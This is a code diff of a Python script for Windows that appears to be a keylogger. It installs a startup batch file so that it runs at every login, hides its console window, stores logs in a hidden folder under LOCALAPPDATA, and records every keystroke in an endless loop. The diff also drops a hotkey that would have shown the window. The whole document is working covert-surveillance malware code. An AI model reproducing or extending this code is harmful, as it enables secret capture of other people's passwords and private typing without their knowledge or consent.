@@ -5,18 +5,27 @@ import winshell
 from keyutil import *
 import keyboard
 import platform
+# import time
 
 thispath = os.path.abspath(__file__)
 pypath = sys.executable
 startup = winshell.startup()
 applocal = os.getenv("LOCALAPPDATA")
+logfolder = os.path.join(applocal, "klg")
+fcount = filecount(logfolder)
+logname = latestlog(fcount)
 
 if platform.system() == "Windows" and not os.path.exists(f"{startup}\klg.bat"):
     newbat(thispath, pypath, startup)
-    createlog(applocal, "keydump.txt")
-    keyboard.add_hotkey("shift+f12", showwindow(), trigger_on_release = True) 
+    createfolder(logfolder)
+    createlog(logfolder, "keydump.txt")
 
 hidecmd()
 
-keyboard.hook()
-
+while True:
+    keybuffer =[]
+    keystroke = keyboard.read_event()
+    # time.sleep(60)
+    keyname = keystroke.name
+    if keystroke.event_type == keyboard.KEY_DOWN:
+        OnKeyboardEvent(logfolder, logname, keyname)
